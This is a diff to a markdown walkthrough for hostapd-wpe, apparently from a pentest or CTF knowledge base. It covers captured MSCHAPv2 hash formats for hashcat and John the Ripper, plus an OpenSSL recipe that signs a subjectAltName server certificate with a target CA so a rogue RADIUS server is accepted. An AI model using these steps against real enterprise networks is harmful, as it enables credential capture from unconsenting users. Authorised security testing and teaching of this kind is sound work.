@@ -1,5 +1,7 @@
 # hostapd-wpe — walkthrough
 
+**Verified against:** hostapd-wpe (patch against hostapd 2.10) as of 2026-Q3
+
 The workhorse for enterprise rogue-AP engagements when you don't
 need eaphammer's higher-level cert-phishing ergonomics. Simpler,
 still deadly against clients with weak cert validation.
@@ -44,12 +46,17 @@ captured EAP exchange looks like:
 
 ```
 mschapv2:
-    username: alice@corp.local
-    challenge: 3d5c1f...        # hex
-    response: 9c8b40...          # hex
-    jtr NETNTLM: alice::corp:9c8b...:3d5c1f
-    hashcat 5500: alice::corp:9c8b...:3d5c1f
+    username:      alice@corp.local
+    challenge:     3d5c1f...                    # 8-byte ChallengeHash
+    response:      9c8b40...                    # 24-byte NTResponse
+    jtr NETNTLM:   alice::corp:9c8b...:3d5c1f
+    hashcat 5500:  alice::corp::9c8b...:3d5c1f  # user::domain::<NTResp>:<ChallengeHash>
 ```
+
+The `challenge` field is the pre-derived 8-byte `ChallengeHash`,
+not the raw 16-byte `PeerChallenge` off the wire — hostapd-wpe
+does the SHA-1 derivation for you. Format details in
+`enterprise/reference.md` under "MSCHAPv2 ChallengeHash derivation".
 
 Feed to hashcat:
 
@@ -69,24 +76,53 @@ gtc:
 
 The token itself may be the flag surface — no crack step.
 
-## Path C — Custom certs (match target CA)
+## Path C — Custom certs (match target CA, with modern SAN)
 
-If the target has a pinned CA:
+Windows 10+ and macOS reject server certs without a matching
+`subjectAltName`. The bare `-subj "/CN=..."` recipe you see in
+older writeups produces certs that no modern client will accept.
+Generate an OpenSSL config with `subjectAltName` + `extendedKeyUsage`
+and reference it with `-extensions`:
 
 ```
-# Generate new server cert signed by the target CA (if you have
-# the CA key from a leaked profile / MDM extract).
-openssl req -new -newkey rsa:2048 -nodes \
-  -keyout /etc/hostapd-wpe/certs/server.key \
-  -out /tmp/server.csr \
-  -subj "/CN=radius.corp.local/O=Corp"
+# openssl-san.cnf
+[req]
+default_bits = 2048
+prompt = no
+distinguished_name = dn
+req_extensions = v3_req
 
-openssl ca -config /path/to/target-ca.cnf \
-  -in /tmp/server.csr \
-  -out /etc/hostapd-wpe/certs/server.pem
+[dn]
+CN = corp-radius.example.com
 
-# hostapd-wpe now presents a cert that a strict validator will accept.
+[v3_req]
+subjectAltName = @alt_names
+extendedKeyUsage = serverAuth
+
+[alt_names]
+DNS.1 = corp-radius.example.com
+DNS.2 = radius.example.com
 ```
+
+```
+# Generate the key + CSR, sign with the target CA if you have it.
+openssl genrsa -out /etc/hostapd-wpe/certs/server.key 2048
+openssl req -new -key /etc/hostapd-wpe/certs/server.key \
+  -out /etc/hostapd-wpe/certs/server.csr \
+  -config openssl-san.cnf
+openssl x509 -req -in /etc/hostapd-wpe/certs/server.csr \
+  -CA /etc/hostapd-wpe/certs/ca.pem \
+  -CAkey /etc/hostapd-wpe/certs/ca.key \
+  -CAcreateserial \
+  -out /etc/hostapd-wpe/certs/server.pem \
+  -days 365 -sha256 \
+  -extensions v3_req -extfile openssl-san.cnf
+```
+
+Without the `-extensions v3_req -extfile openssl-san.cnf` pair on
+the `x509 -req` line, `subjectAltName` is silently dropped from the
+signed cert and modern clients reject the RADIUS. Verify with
+`openssl x509 -noout -text -in server.pem | grep -A1 'Subject Alternative Name'`.
 
 ## Path D — Chain with hostapd + freeradius-wpe
 
@@ -134,6 +170,9 @@ asleap -C <challenge_hex> -R <response_hex> -W /path/to/wordlist.txt
 - hostapd-wpe GitHub (OpenSecurityResearch / brad-anton).
 - Gabriel Ryan — eaphammer talks discuss both.
 - Wright — asleap; hacking-exposed-wireless-3e.
+- RFC 2865 — RADIUS (the protocol hostapd-wpe's mini-RADIUS speaks).
+- RFC 2759 — MSCHAPv2 (the inner-EAP method whose ChallengeHash /
+  NTResponse fields hostapd-wpe logs).
 - attacks.json: `rogue-radius-hostapd-wpe`,
   `mschapv2-challenge-response-capture`,
   `hashcat-5500-mschapv2-crack`.
